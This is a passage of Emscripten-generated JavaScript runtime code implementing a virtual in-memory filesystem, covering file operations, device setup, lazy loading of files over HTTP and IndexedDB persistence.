                FS.trackingDelegate["willDeletePath"](path)
            }
        } catch (e) {
            console.log("FS.trackingDelegate['willDeletePath']('" + path + "') threw an exception: " + e.message)
        }
        parent.node_ops.rmdir(parent, name);
        FS.destroyNode(node);
        try {
            if (FS.trackingDelegate["onDeletePath"]) FS.trackingDelegate["onDeletePath"](path)
        } catch (e) {
            console.log("FS.trackingDelegate['onDeletePath']('" + path + "') threw an exception: " + e.message)
        }
    }),
    readdir: (function(path) {
        var lookup = FS.lookupPath(path, {
            follow: true
        });
        var node = lookup.node;
        if (!node.node_ops.readdir) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOTDIR)
        }
        return node.node_ops.readdir(node)
    }),
    unlink: (function(path) {
        var lookup = FS.lookupPath(path, {
            parent: true
        });
        var parent = lookup.node;
        var name = PATH.basename(path);
        var node = FS.lookupNode(parent, name);
        var err = FS.mayDelete(parent, name, false);
        if (err) {
            throw new FS.ErrnoError(err)
        }
        if (!parent.node_ops.unlink) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        if (FS.isMountpoint(node)) {
            throw new FS.ErrnoError(ERRNO_CODES.EBUSY)
        }
        try {
            if (FS.trackingDelegate["willDeletePath"]) {
                FS.trackingDelegate["willDeletePath"](path)
            }
        } catch (e) {
            console.log("FS.trackingDelegate['willDeletePath']('" + path + "') threw an exception: " + e.message)
        }
        parent.node_ops.unlink(parent, name);
        FS.destroyNode(node);
        try {
            if (FS.trackingDelegate["onDeletePath"]) FS.trackingDelegate["onDeletePath"](path)
        } catch (e) {
            console.log("FS.trackingDelegate['onDeletePath']('" + path + "') threw an exception: " + e.message)
        }
    }),
    readlink: (function(path) {
        var lookup = FS.lookupPath(path);
        var link = lookup.node;
        if (!link) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        if (!link.node_ops.readlink) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        return PATH.resolve(FS.getPath(link.parent), link.node_ops.readlink(link))
    }),
    stat: (function(path, dontFollow) {
        var lookup = FS.lookupPath(path, {
            follow: !dontFollow
        });
        var node = lookup.node;
        if (!node) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        if (!node.node_ops.getattr) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        return node.node_ops.getattr(node)
    }),
    lstat: (function(path) {
        return FS.stat(path, true)
    }),
    chmod: (function(path, mode, dontFollow) {
        var node;
        if (typeof path === "string") {
            var lookup = FS.lookupPath(path, {
                follow: !dontFollow
            });
            node = lookup.node
        } else {
            node = path
        }
        if (!node.node_ops.setattr) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        node.node_ops.setattr(node, {
            mode: mode & 4095 | node.mode & ~4095,
            timestamp: Date.now()
        })
    }),
    lchmod: (function(path, mode) {
        FS.chmod(path, mode, true)
    }),
    fchmod: (function(fd, mode) {
        var stream = FS.getStream(fd);
        if (!stream) {
            throw new FS.ErrnoError(ERRNO_CODES.EBADF)
        }
        FS.chmod(stream.node, mode)
    }),
    chown: (function(path, uid, gid, dontFollow) {
        var node;
        if (typeof path === "string") {
            var lookup = FS.lookupPath(path, {
                follow: !dontFollow
            });
            node = lookup.node
        } else {
            node = path
        }
        if (!node.node_ops.setattr) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        node.node_ops.setattr(node, {
            timestamp: Date.now()
        })
    }),
    lchown: (function(path, uid, gid) {
        FS.chown(path, uid, gid, true)
    }),
    fchown: (function(fd, uid, gid) {
        var stream = FS.getStream(fd);
        if (!stream) {
            throw new FS.ErrnoError(ERRNO_CODES.EBADF)
        }
        FS.chown(stream.node, uid, gid)
    }),
    truncate: (function(path, len) {
        if (len < 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        var node;
        if (typeof path === "string") {
            var lookup = FS.lookupPath(path, {
                follow: true
            });
            node = lookup.node
        } else {
            node = path
        }
        if (!node.node_ops.setattr) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        if (FS.isDir(node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.EISDIR)
        }
        if (!FS.isFile(node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        var err = FS.nodePermissions(node, "w");
        if (err) {
            throw new FS.ErrnoError(err)
        }
        node.node_ops.setattr(node, {
            size: len,
            timestamp: Date.now()
        })
    }),
    ftruncate: (function(fd, len) {
        var stream = FS.getStream(fd);
        if (!stream) {
            throw new FS.ErrnoError(ERRNO_CODES.EBADF)
        }
        if ((stream.flags & 2097155) === 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        FS.truncate(stream.node, len)
    }),
    utime: (function(path, atime, mtime) {
        var lookup = FS.lookupPath(path, {
            follow: true
        });
        var node = lookup.node;
        node.node_ops.setattr(node, {
            timestamp: Math.max(atime, mtime)
        })
    }),
    open: (function(path, flags, mode, fd_start, fd_end) {
        if (path === "") {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        flags = typeof flags === "string" ? FS.modeStringToFlags(flags) : flags;
        mode = typeof mode === "undefined" ? 438 : mode;
        if (flags & 64) {
            mode = mode & 4095 | 32768
        } else {
            mode = 0
        }
        var node;
        if (typeof path === "object") {
            node = path
        } else {
            path = PATH.normalize(path);
            try {
                var lookup = FS.lookupPath(path, {
                    follow: !(flags & 131072)
                });
                node = lookup.node
            } catch (e) {}
        }
        var created = false;
        if (flags & 64) {
            if (node) {
                if (flags & 128) {
                    throw new FS.ErrnoError(ERRNO_CODES.EEXIST)
                }
            } else {
                node = FS.mknod(path, mode, 0);
                created = true
            }
        }
        if (!node) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        if (FS.isChrdev(node.mode)) {
            flags &= ~512
        }
        if (flags & 65536 && !FS.isDir(node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOTDIR)
        }
        if (!created) {
            var err = FS.mayOpen(node, flags);
            if (err) {
                throw new FS.ErrnoError(err)
            }
        }
        if (flags & 512) {
            FS.truncate(node, 0)
        }
        flags &= ~(128 | 512);
        var stream = FS.createStream({
            node: node,
            path: FS.getPath(node),
            flags: flags,
            seekable: true,
            position: 0,
            stream_ops: node.stream_ops,
            ungotten: [],
            error: false
        }, fd_start, fd_end);
        if (stream.stream_ops.open) {
            stream.stream_ops.open(stream)
        }
        if (Module["logReadFiles"] && !(flags & 1)) {
            if (!FS.readFiles) FS.readFiles = {};
            if (!(path in FS.readFiles)) {
                FS.readFiles[path] = 1;
                Module["printErr"]("read file: " + path)
            }
        }
        try {
            if (FS.trackingDelegate["onOpenFile"]) {
                var trackingFlags = 0;
                if ((flags & 2097155) !== 1) {
                    trackingFlags |= FS.tracking.openFlags.READ
                }
                if ((flags & 2097155) !== 0) {
                    trackingFlags |= FS.tracking.openFlags.WRITE
                }
                FS.trackingDelegate["onOpenFile"](path, trackingFlags)
            }
        } catch (e) {
            console.log("FS.trackingDelegate['onOpenFile']('" + path + "', flags) threw an exception: " + e.message)
        }
        return stream
    }),
    close: (function(stream) {
        if (stream.getdents) stream.getdents = null;
        try {
            if (stream.stream_ops.close) {
                stream.stream_ops.close(stream)
            }
        } catch (e) {
            throw e
        } finally {
            FS.closeStream(stream.fd)
        }
    }),
    llseek: (function(stream, offset, whence) {
        if (!stream.seekable || !stream.stream_ops.llseek) {
            throw new FS.ErrnoError(ERRNO_CODES.ESPIPE)
        }
        stream.position = stream.stream_ops.llseek(stream, offset, whence);
        stream.ungotten = [];
        return stream.position
    }),
    read: (function(stream, buffer, offset, length, position) {
        if (length < 0 || position < 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        if ((stream.flags & 2097155) === 1) {
            throw new FS.ErrnoError(ERRNO_CODES.EBADF)
        }
        if (FS.isDir(stream.node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.EISDIR)
        }
        if (!stream.stream_ops.read) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        var seeking = true;
        if (typeof position === "undefined") {
            position = stream.position;
            seeking = false
        } else if (!stream.seekable) {
            throw new FS.ErrnoError(ERRNO_CODES.ESPIPE)
        }
        var bytesRead = stream.stream_ops.read(stream, buffer, offset, length, position);
        if (!seeking) stream.position += bytesRead;
        return bytesRead
    }),
    write: (function(stream, buffer, offset, length, position, canOwn) {
        if (length < 0 || position < 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        if ((stream.flags & 2097155) === 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EBADF)
        }
        if (FS.isDir(stream.node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.EISDIR)
        }
        if (!stream.stream_ops.write) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        if (stream.flags & 1024) {
            FS.llseek(stream, 0, 2)
        }
        var seeking = true;
        if (typeof position === "undefined") {
            position = stream.position;
            seeking = false
        } else if (!stream.seekable) {
            throw new FS.ErrnoError(ERRNO_CODES.ESPIPE)
        }
        var bytesWritten = stream.stream_ops.write(stream, buffer, offset, length, position, canOwn);
        if (!seeking) stream.position += bytesWritten;
        try {
            if (stream.path && FS.trackingDelegate["onWriteToFile"]) FS.trackingDelegate["onWriteToFile"](stream.path)
        } catch (e) {
            console.log("FS.trackingDelegate['onWriteToFile']('" + path + "') threw an exception: " + e.message)
        }
        return bytesWritten
    }),
    allocate: (function(stream, offset, length) {
        if (offset < 0 || length <= 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        if ((stream.flags & 2097155) === 0) {
            throw new FS.ErrnoError(ERRNO_CODES.EBADF)
        }
        if (!FS.isFile(stream.node.mode) && !FS.isDir(stream.node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.ENODEV)
        }
        if (!stream.stream_ops.allocate) {
            throw new FS.ErrnoError(ERRNO_CODES.EOPNOTSUPP)
        }
        stream.stream_ops.allocate(stream, offset, length)
    }),
    mmap: (function(stream, buffer, offset, length, position, prot, flags) {
        if ((stream.flags & 2097155) === 1) {
            throw new FS.ErrnoError(ERRNO_CODES.EACCES)
        }
        if (!stream.stream_ops.mmap) {
            throw new FS.ErrnoError(ERRNO_CODES.ENODEV)
        }
        return stream.stream_ops.mmap(stream, buffer, offset, length, position, prot, flags)
    }),
    msync: (function(stream, buffer, offset, length, mmapFlags) {
        if (!stream || !stream.stream_ops.msync) {
            return 0
        }
        return stream.stream_ops.msync(stream, buffer, offset, length, mmapFlags)
    }),
    munmap: (function(stream) {
        return 0
    }),
    ioctl: (function(stream, cmd, arg) {
        if (!stream.stream_ops.ioctl) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOTTY)
        }
        return stream.stream_ops.ioctl(stream, cmd, arg)
    }),
    readFile: (function(path, opts) {
        opts = opts || {};
        opts.flags = opts.flags || "r";
        opts.encoding = opts.encoding || "binary";
        if (opts.encoding !== "utf8" && opts.encoding !== "binary") {
            throw new Error('Invalid encoding type "' + opts.encoding + '"')
        }
        var ret;
        var stream = FS.open(path, opts.flags);
        var stat = FS.stat(path);
        var length = stat.size;
        var buf = new Uint8Array(length);
        FS.read(stream, buf, 0, length, 0);
        if (opts.encoding === "utf8") {
            ret = UTF8ArrayToString(buf, 0)
        } else if (opts.encoding === "binary") {
            ret = buf
        }
        FS.close(stream);
        return ret
    }),
    writeFile: (function(path, data, opts) {
        opts = opts || {};
        opts.flags = opts.flags || "w";
        opts.encoding = opts.encoding || "utf8";
        if (opts.encoding !== "utf8" && opts.encoding !== "binary") {
            throw new Error('Invalid encoding type "' + opts.encoding + '"')
        }
        var stream = FS.open(path, opts.flags, opts.mode);
        if (opts.encoding === "utf8") {
            var buf = new Uint8Array(lengthBytesUTF8(data) + 1);
            var actualNumBytes = stringToUTF8Array(data, buf, 0, buf.length);
            FS.write(stream, buf, 0, actualNumBytes, 0, opts.canOwn)
        } else if (opts.encoding === "binary") {
            FS.write(stream, data, 0, data.length, 0, opts.canOwn)
        }
        FS.close(stream)
    }),
    cwd: (function() {
        return FS.currentPath
    }),
    chdir: (function(path) {
        var lookup = FS.lookupPath(path, {
            follow: true
        });
        if (lookup.node === null) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        if (!FS.isDir(lookup.node.mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOTDIR)
        }
        var err = FS.nodePermissions(lookup.node, "x");
        if (err) {
            throw new FS.ErrnoError(err)
        }
        FS.currentPath = lookup.path
    }),
    createDefaultDirectories: (function() {
        FS.mkdir("/tmp");
        FS.mkdir("/home");
        FS.mkdir("/home/web_user")
    }),
    createDefaultDevices: (function() {
        FS.mkdir("/dev");
        FS.registerDevice(FS.makedev(1, 3), {
            read: (function() {
                return 0
            }),
            write: (function(stream, buffer, offset, length, pos) {
                return length
            })
        });
        FS.mkdev("/dev/null", FS.makedev(1, 3));
        TTY.register(FS.makedev(5, 0), TTY.default_tty_ops);
        TTY.register(FS.makedev(6, 0), TTY.default_tty1_ops);
        FS.mkdev("/dev/tty", FS.makedev(5, 0));
        FS.mkdev("/dev/tty1", FS.makedev(6, 0));
        var random_device;
        if (typeof crypto !== "undefined") {
            var randomBuffer = new Uint8Array(1);
            random_device = (function() {
                crypto.getRandomValues(randomBuffer);
                return randomBuffer[0]
            })
        } else if (ENVIRONMENT_IS_NODE) {
            random_device = (function() {
                return require("crypto").randomBytes(1)[0]
            })
        } else {
            random_device = (function() {
                return Math.random() * 256 | 0
            })
        }
        FS.createDevice("/dev", "random", random_device);
        FS.createDevice("/dev", "urandom", random_device);
        FS.mkdir("/dev/shm");
        FS.mkdir("/dev/shm/tmp")
    }),
    createSpecialDirectories: (function() {
        FS.mkdir("/proc");
        FS.mkdir("/proc/self");
        FS.mkdir("/proc/self/fd");
        FS.mount({
            mount: (function() {
                var node = FS.createNode("/proc/self", "fd", 16384 | 511, 73);
                node.node_ops = {
                    lookup: (function(parent, name) {
                        var fd = +name;
                        var stream = FS.getStream(fd);
                        if (!stream) throw new FS.ErrnoError(ERRNO_CODES.EBADF);
                        var ret = {
                            parent: null,
                            mount: {
                                mountpoint: "fake"
                            },
                            node_ops: {
                                readlink: (function() {
                                    return stream.path
                                })
                            }
                        };
                        ret.parent = ret;
                        return ret
                    })
                };
                return node
            })
        }, {}, "/proc/self/fd")
    }),
    createStandardStreams: (function() {
        if (Module["stdin"]) {
            FS.createDevice("/dev", "stdin", Module["stdin"])
        } else {
            FS.symlink("/dev/tty", "/dev/stdin")
        }
        if (Module["stdout"]) {
            FS.createDevice("/dev", "stdout", null, Module["stdout"])
        } else {
            FS.symlink("/dev/tty", "/dev/stdout")
        }
        if (Module["stderr"]) {
            FS.createDevice("/dev", "stderr", null, Module["stderr"])
        } else {
            FS.symlink("/dev/tty1", "/dev/stderr")
        }
        var stdin = FS.open("/dev/stdin", "r");
        assert(stdin.fd === 0, "invalid handle for stdin (" + stdin.fd + ")");
        var stdout = FS.open("/dev/stdout", "w");
        assert(stdout.fd === 1, "invalid handle for stdout (" + stdout.fd + ")");
        var stderr = FS.open("/dev/stderr", "w");
        assert(stderr.fd === 2, "invalid handle for stderr (" + stderr.fd + ")")
    }),
    ensureErrnoError: (function() {
        if (FS.ErrnoError) return;
        FS.ErrnoError = function ErrnoError(errno, node) {
            this.node = node;
            this.setErrno = (function(errno) {
                this.errno = errno;
                for (var key in ERRNO_CODES) {
                    if (ERRNO_CODES[key] === errno) {
                        this.code = key;
                        break
                    }
                }
            });
            this.setErrno(errno);
            this.message = ERRNO_MESSAGES[errno]
        };
        FS.ErrnoError.prototype = new Error;
        FS.ErrnoError.prototype.constructor = FS.ErrnoError;
        [ERRNO_CODES.ENOENT].forEach((function(code) {
            FS.genericErrors[code] = new FS.ErrnoError(code);
            FS.genericErrors[code].stack = "<generic error, no stack>"
        }))
    }),
    staticInit: (function() {
        FS.ensureErrnoError();
        FS.nameTable = new Array(4096);
        FS.mount(MEMFS, {}, "/");
        FS.createDefaultDirectories();
        FS.createDefaultDevices();
        FS.createSpecialDirectories();
        FS.filesystems = {
            "MEMFS": MEMFS,
            "IDBFS": IDBFS,
            "NODEFS": NODEFS,
            "WORKERFS": WORKERFS
        }
    }),
    init: (function(input, output, error) {
        assert(!FS.init.initialized, "FS.init was previously called. If you want to initialize later with custom parameters, remove any earlier calls (note that one is automatically added to the generated code)");
        FS.init.initialized = true;
        FS.ensureErrnoError();
        Module["stdin"] = input || Module["stdin"];
        Module["stdout"] = output || Module["stdout"];
        Module["stderr"] = error || Module["stderr"];
        FS.createStandardStreams()
    }),
    quit: (function() {
        FS.init.initialized = false;
        var fflush = Module["_fflush"];
        if (fflush) fflush(0);
        for (var i = 0; i < FS.streams.length; i++) {
            var stream = FS.streams[i];
            if (!stream) {
                continue
            }
            FS.close(stream)
        }
    }),
    getMode: (function(canRead, canWrite) {
        var mode = 0;
        if (canRead) mode |= 292 | 73;
        if (canWrite) mode |= 146;
        return mode
    }),
    joinPath: (function(parts, forceRelative) {
        var path = PATH.join.apply(null, parts);
        if (forceRelative && path[0] == "/") path = path.substr(1);
        return path
    }),
    absolutePath: (function(relative, base) {
        return PATH.resolve(base, relative)
    }),
    standardizePath: (function(path) {
        return PATH.normalize(path)
    }),
    findObject: (function(path, dontResolveLastLink) {
        var ret = FS.analyzePath(path, dontResolveLastLink);
        if (ret.exists) {
            return ret.object
        } else {
            ___setErrNo(ret.error);
            return null
        }
    }),
    analyzePath: (function(path, dontResolveLastLink) {
        try {
            var lookup = FS.lookupPath(path, {
                follow: !dontResolveLastLink
            });
            path = lookup.path
        } catch (e) {}
        var ret = {
            isRoot: false,
            exists: false,
            error: 0,
            name: null,
            path: null,
            object: null,
            parentExists: false,
            parentPath: null,
            parentObject: null
        };
        try {
            var lookup = FS.lookupPath(path, {
                parent: true
            });
            ret.parentExists = true;
            ret.parentPath = lookup.path;
            ret.parentObject = lookup.node;
            ret.name = PATH.basename(path);
            lookup = FS.lookupPath(path, {
                follow: !dontResolveLastLink
            });
            ret.exists = true;
            ret.path = lookup.path;
            ret.object = lookup.node;
            ret.name = lookup.node.name;
            ret.isRoot = lookup.path === "/"
        } catch (e) {
            ret.error = e.errno
        }
        return ret
    }),
    createFolder: (function(parent, name, canRead, canWrite) {
        var path = PATH.join2(typeof parent === "string" ? parent : FS.getPath(parent), name);
        var mode = FS.getMode(canRead, canWrite);
        return FS.mkdir(path, mode)
    }),
    createPath: (function(parent, path, canRead, canWrite) {
        parent = typeof parent === "string" ? parent : FS.getPath(parent);
        var parts = path.split("/").reverse();
        while (parts.length) {
            var part = parts.pop();
            if (!part) continue;
            var current = PATH.join2(parent, part);
            try {
                FS.mkdir(current)
            } catch (e) {}
            parent = current
        }
        return current
    }),
    createFile: (function(parent, name, properties, canRead, canWrite) {
        var path = PATH.join2(typeof parent === "string" ? parent : FS.getPath(parent), name);
        var mode = FS.getMode(canRead, canWrite);
        return FS.create(path, mode)
    }),
    createDataFile: (function(parent, name, data, canRead, canWrite, canOwn) {
        var path = name ? PATH.join2(typeof parent === "string" ? parent : FS.getPath(parent), name) : parent;
        var mode = FS.getMode(canRead, canWrite);
        var node = FS.create(path, mode);
        if (data) {
            if (typeof data === "string") {
                var arr = new Array(data.length);
                for (var i = 0, len = data.length; i < len; ++i) arr[i] = data.charCodeAt(i);
                data = arr
            }
            FS.chmod(node, mode | 146);
            var stream = FS.open(node, "w");
            FS.write(stream, data, 0, data.length, 0, canOwn);
            FS.close(stream);
            FS.chmod(node, mode)
        }
        return node
    }),
    createDevice: (function(parent, name, input, output) {
        var path = PATH.join2(typeof parent === "string" ? parent : FS.getPath(parent), name);
        var mode = FS.getMode(!!input, !!output);
        if (!FS.createDevice.major) FS.createDevice.major = 64;
        var dev = FS.makedev(FS.createDevice.major++, 0);
        FS.registerDevice(dev, {
            open: (function(stream) {
                stream.seekable = false
            }),
            close: (function(stream) {
                if (output && output.buffer && output.buffer.length) {
                    output(10)
                }
            }),
            read: (function(stream, buffer, offset, length, pos) {
                var bytesRead = 0;
                for (var i = 0; i < length; i++) {
                    var result;
                    try {
                        result = input()
                    } catch (e) {
                        throw new FS.ErrnoError(ERRNO_CODES.EIO)
                    }
                    if (result === undefined && bytesRead === 0) {
                        throw new FS.ErrnoError(ERRNO_CODES.EAGAIN)
                    }
                    if (result === null || result === undefined) break;
                    bytesRead++;
                    buffer[offset + i] = result
                }
                if (bytesRead) {
                    stream.node.timestamp = Date.now()
                }
                return bytesRead
            }),
            write: (function(stream, buffer, offset, length, pos) {
                for (var i = 0; i < length; i++) {
                    try {
                        output(buffer[offset + i])
                    } catch (e) {
                        throw new FS.ErrnoError(ERRNO_CODES.EIO)
                    }
                }
                if (length) {
                    stream.node.timestamp = Date.now()
                }
                return i
            })
        });
        return FS.mkdev(path, mode, dev)
    }),
    createLink: (function(parent, name, target, canRead, canWrite) {
        var path = PATH.join2(typeof parent === "string" ? parent : FS.getPath(parent), name);
        return FS.symlink(target, path)
    }),
    forceLoadFile: (function(obj) {
        if (obj.isDevice || obj.isFolder || obj.link || obj.contents) return true;
        var success = true;
        if (typeof XMLHttpRequest !== "undefined") {
            throw new Error("Lazy loading should have been performed (contents set) in createLazyFile, but it was not. Lazy loading only works in web workers. Use --embed-file or --preload-file in emcc on the main thread.")
        } else if (Module["read"]) {
            try {
                obj.contents = intArrayFromString(Module["read"](obj.url), true);
                obj.usedBytes = obj.contents.length
            } catch (e) {
                success = false
            }
        } else {
            throw new Error("Cannot load without read() or XMLHttpRequest.")
        }
        if (!success) ___setErrNo(ERRNO_CODES.EIO);
        return success
    }),
    createLazyFile: (function(parent, name, url, canRead, canWrite) {
        function LazyUint8Array() {
            this.lengthKnown = false;
            this.chunks = []
        }
        LazyUint8Array.prototype.get = function LazyUint8Array_get(idx) {
            if (idx > this.length - 1 || idx < 0) {
                return undefined
            }
            var chunkOffset = idx % this.chunkSize;
            var chunkNum = idx / this.chunkSize | 0;
            return this.getter(chunkNum)[chunkOffset]
        };
        LazyUint8Array.prototype.setDataGetter = function LazyUint8Array_setDataGetter(getter) {
            this.getter = getter
        };
        LazyUint8Array.prototype.cacheLength = function LazyUint8Array_cacheLength() {
            var xhr = new XMLHttpRequest;
            xhr.open("HEAD", url, false);
            xhr.send(null);
            if (!(xhr.status >= 200 && xhr.status < 300 || xhr.status === 304)) throw new Error("Couldn't load " + url + ". Status: " + xhr.status);
            var datalength = Number(xhr.getResponseHeader("Content-length"));
            var header;
            var hasByteServing = (header = xhr.getResponseHeader("Accept-Ranges")) && header === "bytes";
            var usesGzip = (header = xhr.getResponseHeader("Content-Encoding")) && header === "gzip";
            var chunkSize = 1024 * 1024;
            if (!hasByteServing) chunkSize = datalength;
            var doXHR = (function(from, to) {
                if (from > to) throw new Error("invalid range (" + from + ", " + to + ") or no bytes requested!");
                if (to > datalength - 1) throw new Error("only " + datalength + " bytes available! programmer error!");
                var xhr = new XMLHttpRequest;
                xhr.open("GET", url, false);
                if (datalength !== chunkSize) xhr.setRequestHeader("Range", "bytes=" + from + "-" + to);
                if (typeof Uint8Array != "undefined") xhr.responseType = "arraybuffer";
                if (xhr.overrideMimeType) {
                    xhr.overrideMimeType("text/plain; charset=x-user-defined")
                }
                xhr.send(null);
                if (!(xhr.status >= 200 && xhr.status < 300 || xhr.status === 304)) throw new Error("Couldn't load " + url + ". Status: " + xhr.status);
                if (xhr.response !== undefined) {
                    return new Uint8Array(xhr.response || [])
                } else {
                    return intArrayFromString(xhr.responseText || "", true)
                }
            });
            var lazyArray = this;
            lazyArray.setDataGetter((function(chunkNum) {
                var start = chunkNum * chunkSize;
                var end = (chunkNum + 1) * chunkSize - 1;
                end = Math.min(end, datalength - 1);
                if (typeof lazyArray.chunks[chunkNum] === "undefined") {
                    lazyArray.chunks[chunkNum] = doXHR(start, end)
                }
                if (typeof lazyArray.chunks[chunkNum] === "undefined") throw new Error("doXHR failed!");
                return lazyArray.chunks[chunkNum]
            }));
            if (usesGzip || !datalength) {
                chunkSize = datalength = 1;
                datalength = this.getter(0).length;
                chunkSize = datalength;
                console.log("LazyFiles on gzip forces download of the whole file when length is accessed")
            }
            this._length = datalength;
            this._chunkSize = chunkSize;
            this.lengthKnown = true
        };
        if (typeof XMLHttpRequest !== "undefined") {
            if (!ENVIRONMENT_IS_WORKER) throw "Cannot do synchronous binary XHRs outside webworkers in modern browsers. Use --embed-file or --preload-file in emcc";
            var lazyArray = new LazyUint8Array;
            Object.defineProperties(lazyArray, {
                length: {
                    get: (function() {
                        if (!this.lengthKnown) {
                            this.cacheLength()
                        }
                        return this._length
                    })
                },
                chunkSize: {
                    get: (function() {
                        if (!this.lengthKnown) {
                            this.cacheLength()
                        }
                        return this._chunkSize
                    })
                }
            });
            var properties = {
                isDevice: false,
                contents: lazyArray
            }
        } else {
            var properties = {
                isDevice: false,
                url: url
            }
        }
        var node = FS.createFile(parent, name, properties, canRead, canWrite);
        if (properties.contents) {
            node.contents = properties.contents
        } else if (properties.url) {
            node.contents = null;
            node.url = properties.url
        }
        Object.defineProperties(node, {
            usedBytes: {
                get: (function() {
                    return this.contents.length
                })
            }
        });
        var stream_ops = {};
        var keys = Object.keys(node.stream_ops);
        keys.forEach((function(key) {
            var fn = node.stream_ops[key];
            stream_ops[key] = function forceLoadLazyFile() {
                if (!FS.forceLoadFile(node)) {
                    throw new FS.ErrnoError(ERRNO_CODES.EIO)
                }
                return fn.apply(null, arguments)
            }
        }));
        stream_ops.read = function stream_ops_read(stream, buffer, offset, length, position) {
            if (!FS.forceLoadFile(node)) {
                throw new FS.ErrnoError(ERRNO_CODES.EIO)
            }
            var contents = stream.node.contents;
            if (position >= contents.length) return 0;
            var size = Math.min(contents.length - position, length);
            assert(size >= 0);
            if (contents.slice) {
                for (var i = 0; i < size; i++) {
                    buffer[offset + i] = contents[position + i]
                }
            } else {
                for (var i = 0; i < size; i++) {
                    buffer[offset + i] = contents.get(position + i)
                }
            }
            return size
        };
        node.stream_ops = stream_ops;
        return node
    }),
    createPreloadedFile: (function(parent, name, url, canRead, canWrite, onload, onerror, dontCreateFile, canOwn, preFinish) {
        Browser.init();
        var fullname = name ? PATH.resolve(PATH.join2(parent, name)) : parent;
        var dep = getUniqueRunDependency("cp " + fullname);

        function processData(byteArray) {
            function finish(byteArray) {
                if (preFinish) preFinish();
                if (!dontCreateFile) {
                    FS.createDataFile(parent, name, byteArray, canRead, canWrite, canOwn)
                }
                if (onload) onload();
                removeRunDependency(dep)
            }
            var handled = false;
            Module["preloadPlugins"].forEach((function(plugin) {
                if (handled) return;
                if (plugin["canHandle"](fullname)) {
                    plugin["handle"](byteArray, fullname, finish, (function() {
                        if (onerror) onerror();
                        removeRunDependency(dep)
                    }));
                    handled = true
                }
            }));
            if (!handled) finish(byteArray)
        }
        addRunDependency(dep);
        if (typeof url == "string") {
            Browser.asyncLoad(url, (function(byteArray) {
                processData(byteArray)
            }), onerror)
        } else {
            processData(url)
        }
    }),
    indexedDB: (function() {
        return window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB
    }),
    DB_NAME: (function() {
        return "EM_FS_" + window.location.pathname
    }),
    DB_VERSION: 20,
    DB_STORE_NAME: "FILE_DATA",
    saveFilesToDB: (function(paths, onload, onerror) {
        onload = onload || (function() {});
        onerror = onerror || (function() {});
        var indexedDB = FS.indexedDB();
        try {
            var openRequest = indexedDB.open(FS.DB_NAME(), FS.DB_VERSION)
        } catch (e) {
            return onerror(e)
        }
        openRequest.onupgradeneeded = function openRequest_onupgradeneeded() {
            console.log("creating db");
            var db = openRequest.result;
            db.createObjectStore(FS.DB_STORE_NAME)
        };
        openRequest.onsuccess = function openRequest_onsuccess() {
            var db = openRequest.result;
            var transaction = db.transaction([FS.DB_STORE_NAME], "readwrite");
            var files = transaction.objectStore(FS.DB_STORE_NAME);
            var ok = 0,
                fail = 0,
                total = paths.length;

            function finish() {
                if (fail == 0) onload();
                else onerror()
            }
            paths.forEach((function(path) {
                var putRequest = files.put(FS.analyzePath(path).object.contents, path);
                putRequest.onsuccess = function putRequest_onsuccess() {
                    ok++;
                    if (ok + fail == total) finish()
                };
                putRequest.onerror = function putRequest_onerror() {
                    fail++;
                    if (ok + fail == total) finish()
                }
            }));
            transaction.onerror = onerror
        };
        openRequest.onerror = onerror
    }),
    loadFilesFromDB: (function(paths, onload, onerror) {
        onload = onload || (function() {});
        onerror = onerror || (function() {});
        var indexedDB = FS.indexedDB();
        try {
            var openRequest = indexedDB.open(FS.DB_NAME(), FS.DB_VERSION)
        } catch (e) {
            return onerror(e)
        }
        openRequest.onupgradeneeded = onerror;
        openRequest.onsuccess = function openRequest_onsuccess() {
            var db = openRequest.result;
            try {
                var transaction = db.transaction([FS.DB_STORE_NAME], "readonly")
            } catch (e) {
                onerror(e);
                return
            }
            var files = transaction.objectStore(FS.DB_STORE_NAME);
            var ok = 0,
                fail = 0,
                total = paths.length;

            function finish() {
                if (fail == 0) onload();
                else onerror()
            }
            paths.forEach((function(path) {
                var getRequest = files.get(path);
                getRequest.onsuccess = function getRequest_onsuccess() {
                    if (FS.analyzePath(path).exists) {
                        FS.unlink(path)
                    }
                    FS.createDataFile(PATH.dirname(path), PATH.basename(path), getRequest.result, true, true, true);
                    ok++;
                    if (ok + fail == total) finish()
                };
                getRequest.onerror = function getRequest_onerror() {
                    fail++;
                    if (ok + fail == total) finish()
                }
            }));
            transaction.onerror = onerror
        };
        openRequest.onerror = onerror
    })
};
var SYSCALLS = {
    DEFAULT_POLLMASK: 5,
    mappings: {},
    umask: 511,
    calculateAt: (function(dirfd, path) {
        if (path[0] !== "/") {
            var dir;
            if (dirfd === -100) {
                dir = FS.cwd()
            } else {
